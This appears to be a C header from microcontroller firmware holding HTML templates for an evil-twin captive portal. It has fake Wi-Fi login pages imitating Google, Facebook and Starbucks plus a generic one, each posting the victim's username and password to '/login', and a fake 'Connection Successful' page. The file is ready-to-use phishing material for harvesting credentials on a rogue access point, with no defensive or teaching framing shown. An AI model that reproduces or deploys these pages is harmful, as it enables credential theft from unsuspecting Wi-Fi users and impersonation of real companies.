#pragma once

enum PortalTemplate {
    TEMPLATE_GENERIC,
    TEMPLATE_GOOGLE,
    TEMPLATE_FACEBOOK,
    TEMPLATE_STARBUCKS
};

const char* const TEMPLATE_NAMES[] = {
    "GENERIC",
    "GOOGLE",
    "FACEBOOK",
    "STARBUCKS"
};

const char GENERIC_LOGIN_HTML[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
h2 { color: #1c1e21; margin-bottom: 1.5rem; text-align: center; }
input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 1rem; }
</style></head><body>
<div class='card'>
<h2>Wi-Fi Login</h2>
<form action='/login' method='POST'>
<input type='text' name='user' placeholder='Username / Email' required>
<input type='password' name='pass' placeholder='Password' required>
<button type='submit'>Connect</button>
</form></div></body></html>
)HTML";

const char GOOGLE_LOGIN_HTML[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
body { font-family: 'Roboto', Arial; background: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.card { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; width: 100%; max-width: 450px; text-align: center; }
.logo { font-size: 24px; font-weight: bold; margin-bottom: 10px; }
.logo span:nth-child(1) { color: #4285F4; } .logo span:nth-child(2) { color: #EA4335; } .logo span:nth-child(3) { color: #FBBC05; } .logo span:nth-child(4) { color: #4285F4; } .logo span:nth-child(5) { color: #34A853; } .logo span:nth-child(6) { color: #EA4335; }
h2 { font-size: 24px; font-weight: 400; margin-bottom: 8px; }
p { margin-bottom: 24px; }
input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
.btn-container { display: flex; justify-content: space-between; align-items: center; margin-top: 26px; }
button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
a { color: #1a73e8; text-decoration: none; font-weight: 500; font-size: 14px; }
</style></head><body>
<div class='card'>
<div class='logo'><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<h2>Sign in</h2>
<p>to continue to Wi-Fi</p>
<form action='/login' method='POST'>
<input type='email' name='user' placeholder='Email or phone' required>
<input type='password' name='pass' placeholder='Enter your password' required>
<div class='btn-container'><a href='#'>Forgot email?</a><button type='submit'>Next</button></div>
</form></div></body></html>
)HTML";

const char FACEBOOK_LOGIN_HTML[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; flex-direction: column; align-items: center; padding-top: 50px; margin: 0; }
.logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; }
.card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 396px; text-align: center; }
input { width: 100%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 12px; }
.divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
.create-btn { background: #42b72a; font-size: 17px; padding: 0 16px; width: auto; display: inline-block; line-height: 48px; }
a { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 16px; }
</style></head><body>
<div class='logo'>facebook</div>
<div class='card'>
<form action='/login' method='POST'>
<input type='text' name='user' placeholder='Email or phone number' required>
<input type='password' name='pass' placeholder='Password' required>
<button type='submit'>Log In</button>
<a href='#'>Forgotten password?</a>
<div class='divider'></div>
<button type='button' class='create-btn'>Create New Account</button>
</form></div></body></html>
)HTML";

const char STARBUCKS_LOGIN_HTML[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
body { font-family: 'SoDo Sans', Helvetica, Arial, sans-serif; background: #f7f7f7; margin: 0; display: flex; flex-direction: column; align-items: center; }
header { background: #006241; width: 100%; padding: 15px 0; text-align: center; color: white; font-weight: bold; font-size: 20px; }
.card { background: white; padding: 30px; margin-top: 30px; width: 90%; max-width: 400px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
h2 { color: #000; font-size: 24px; margin-bottom: 20px; }
input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid rgba(0,0,0,0.1); border-radius: 8px; font-size: 16px; box-sizing: border-box; }
button { width: 100%; padding: 15px; background: #006241; color: white; border: none; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px; }
p { font-size: 14px; color: rgba(0,0,0,0.6); line-height: 1.5; }
</style></head><body>
<header>Starbucks Wi-Fi</header>
<div class='card'>
<h2>Welcome back</h2>
<form action='/login' method='POST'>
<input type='text' name='user' placeholder='Username or Email' required>
<input type='password' name='pass' placeholder='Password' required>
<button type='submit'>Sign in</button>
</form>
<p>By signing in, you agree to the Starbucks Wi-Fi Terms of Use.</p>
</div></body></html>
)HTML";

const char SUCCESS_HTML[] PROGMEM = R"HTML(
<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>
<style>
body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
h2 { color: #42b72a; }
p { color: #606770; }
</style></head><body>
<div class='card'>
<h2>Connection Successful</h2>
<p>You are now connected to the Wi-Fi network. You can close this window.</p>
</div></body></html>
)HTML";
